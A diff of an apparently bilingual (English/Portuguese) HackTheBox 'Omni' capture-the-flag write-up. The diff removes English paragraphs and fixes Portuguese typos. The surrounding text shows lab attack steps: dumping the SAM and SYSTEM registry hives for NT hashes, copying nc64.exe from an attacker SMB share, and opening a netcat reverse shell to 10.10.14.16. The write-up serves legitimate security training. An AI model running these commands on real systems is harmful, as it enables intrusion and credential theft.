@@ -215,8 +215,7 @@ icacls C:\Data\Users\administrator\root.txt  # NT AUTHORITY\SYSTEM:(I)(F)
 											 # BUILTIN\Administrators:(I)(F)
 											 # OMNI\Administrator:(I)(F)
 </code></pre>
-<p>At this point, we suppose we have to migrate at the user app, or directly at administrator... We don't know what privilege we have, but we know with SAM and SYSTEM files, we can extract all NT hash from all LOCAL users of the target machine. We give a try...</p>
-<p>O proximo passo é migrar de usuários. Nest momento nos estamos com um usuário do Windows Device Portal, e não como usuário da máquina alvo. Esse tipo de usuário pode executar alguns comando no sistema mas tem um poder muito maior. Tem privilégios para verificar a memória RAM do sistema. Isso significa que podemos extrair o HKLM\System e o HKLM\Sam para recuperar informações dos usuários locais (uid:rid:lmhash:nthash)</p>
+<p>O proximo passo é migrar de usuários. Neste momento nós estamos com um usuário do Windows Device Portal, e não como usuário da máquina alvo. Esse tipo de usuário pode executar alguns comando no sistema mas tem um poder muito maior. Tem privilégios para verificar a memória RAM do sistema. Isso significa que podemos extrair o HKLM\System e o HKLM\Sam para recuperar informações dos usuários locais (uid:rid:lmhash:nthash)</p>
 <pre><code class="language-bash">reg save HKLM\SYSTEM SYSTEM.bak  # The operation completed successfully.
 reg save HKLM\SAM SAM.bak        # The operation completed successfully.
 
@@ -262,7 +261,6 @@ copy \\10.10.14.16\smbFolder\nc64.exe C:\Windows\System32\spool\drivers\color\nc
 C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.16 443
 </code></pre>
 <h2 id="user-app"><a class="header" href="#user-app">User &quot;app&quot;</a></h2>
-<p>In the home directory of &quot;app&quot;, we can see the user.txt, but we can see another strange file: iot-admin.xml. The file looks like this:</p>
 <p>Na pasta raiz do usuário &quot;app&quot;, podemos ver a flag user.txt, mas também vemos um outro ficheiro estranho: iot-admin.xml. O ficheiro contém o seguinte:</p>
 <p><img src="Assets/HTB-Windows-Easy-omni/SS-file.png" alt="ss-files" /></p>
 <p>Este tipo de ficheiro é uma Credencial de Powershell. Para extrair o campo Password, podemos fazer o seguinte:</p>
